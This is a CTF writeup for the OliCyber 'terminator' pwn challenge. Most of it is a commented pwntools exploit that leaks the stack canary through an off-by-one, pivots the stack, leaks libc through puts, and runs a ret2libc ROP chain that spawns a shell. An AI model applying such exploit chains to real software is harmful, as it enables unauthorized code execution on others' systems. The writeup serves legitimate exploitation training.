#terminator writeup
this is my writeup of terminator olicyber pwn challenge.
below you can see my exploit all commented.

#solution
the main vulnerabilities are an off by one on the first printf/read which allows us to leak stack canary and sbp and a buffer overflow which allows us to build a ret2libc attack .
we also need stack pivoting to create the necessary space for our rop chains which will allow us to leak the base of the stack.
#exploit 

``` 
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=terminator.challs.olicyber.it' '--port=10307' terminator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('terminator_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
#on the first read we found an off by one bug so we can actualy over write the first byte of the canary
#so the pritf will stamp the canary and the bp
io.sendafter(b">", b"A"*56) #off by one
io.recvuntil(b'Hello '+ b'A'*56)
canary=io.recv(8) # save the canary  
svb=io.recvuntil(b'Nice' , drop=True)#save the base pointer 
canary=b"\x00"+canary[1:8] 
real_canary=u64(canary[0:8]) #conver the canary to unsigned 64 bit
#print(len(svb))
#print(svb)
real_svb=u64(svb.ljust(8,b'\x00')) #convert the save base poiter to unsigned 64 bit
print(hex(real_canary))
print(hex(real_svb))
target_bp=real_svb-0x68 # target of the first base pointer with gdb 

pop_rdi=0x4012fb # position poprdi command: ropper --file=terminator 
system=0x52290 #function system command : readelf -a libc.so.6 | grep system 
puts1=0x84420 # offset of puts 1 i need it to find glibc base trovata con  readelf -a libc.so.6 | grep puts 
binsh=0x1b45bd# position /bin/sh command :strings -a -t x libc.so.6 | grep /bin/sh  


payload2=flat(
    #this is the first rop chain, it allows us to do stack pivoting and write the rop chain on the stack
    #after call the main again to execute it and leak the obtained address of puts to later calculate the base of libc
     p64(pop_rdi),#address of pop rdi
     p64(exe.got.puts),#address of got puts fucnion
     p64(exe.sym.puts),#address that will actualy print the got puts addres
     p64(0x00401292), #ret 
     p64(exe.sym.main),#calling main again
     b'A'*16,#fill the remaining space of the buffer
     p64(real_canary), #send the canary to bypass the canary mitigation
     p64(target_bp), #send the target base pointe    
    )

io.sendafter(b">", payload2)#execute our first ropchain 
#at this point we have the bp and sp on the same positon
io.recvuntil(b'bye!\n') 
leak_puts=io.recvline()[0:-1] #we save the leak on a variable to find the base of libc
real_leak_puts=u64(leak_puts.ljust(8,b'\x00'))#convert it to  unsigned 64 bit
print(hex(real_leak_puts))
base=real_leak_puts-puts1 # the base will be the difference between our second leak of puts(that we just found) and the first leak of puts
target_bp2= real_svb - 0xa8 # target of the first base pointer with gdb 
#we have all the leaks we need we just need the rop to pop the shell
payload=flat(
    p64(pop_rdi), #start of the rop 
    p64(binsh+base),#address of bin sh+ base
    p64(system+base), #address of system + base
    b'A'*32, #fill the remaining space of the buffer
    p64(real_canary), # send the canary to bypass the canary mitigation
    p64(target_bp2),# send the target base pointer 
)
io.sendlineafter(b'>',b'ferro') #we send our name 

io.sendlineafter(b'from?',payload)# send our secondo rop to pop the shell and here we are we can cat the flag :)

io.interactive()


 

```
